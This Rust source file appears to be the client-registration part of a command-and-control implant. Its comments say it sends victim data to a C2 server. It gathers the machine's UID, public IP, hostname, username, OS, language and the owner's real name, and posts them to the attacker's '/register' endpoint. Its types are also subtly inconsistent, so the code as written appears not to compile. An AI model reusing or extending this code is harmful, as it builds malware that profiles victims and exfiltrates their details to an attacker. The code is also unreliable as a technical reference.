use std::collections::HashMap;

extern crate reqwest;
extern crate serde_json;
extern crate whoami;

pub fn register_client(host: &str, uid: &str) -> Result<String, String> {
    let uri = format!("{}/register", host);

    let mut obj = HashMap::<&'static str, &'static str>::new();

    obj.insert("uid", uid); // Insert machine UID to send to C2 server.

    let ip = get_ip();

    obj.insert("ip", ip.as_str()); // Insert machine IP to send to C2 server.

    let machine_details = machine_details();

    for (key, value) in &machine_details {
        obj.insert(key, value);
    }

    let client = reqwest::blocking::Client::new();
    let res = client.post(uri).json(&obj).send();

    match res {
        Ok(response) => {
            if response.status().is_success() {
                let text = response.text().unwrap();
                Ok(text)
            } else {
                // Return error message from response body if status code is not 200. The response is a json object. Give me the value of the "message" key.
                let text = response.text().unwrap();
                let json: serde_json::Value = serde_json::from_str(&text).unwrap();
                let message = json["message"].as_str().unwrap();
                Err(message.to_string())
            }
        }
        Err(err) => {
            if err.is_connect() {
                println!("No connection received from C2");
                Err("No connection received from C2".to_string())
            } else {
                Err("Unknown error".to_string())
            }
        }
    }
}

pub fn machine_details() -> HashMap<&'static str, String> {
    let mut details = HashMap::new();
    details.insert("hostname", whoami::hostname());
    details.insert("username", whoami::username());
    details.insert("os", whoami::distro());
    details.insert("lang", whoami::lang().next().unwrap());
    details.insert("fullname", whoami::realname());

    details
}

pub fn get_ip() -> String {
    let res = reqwest::blocking::get("https://api.seeip.org/");

    if res.is_ok() {
        res.unwrap().text().unwrap()
    } else {
        String::from("IP not found.")
    }
}
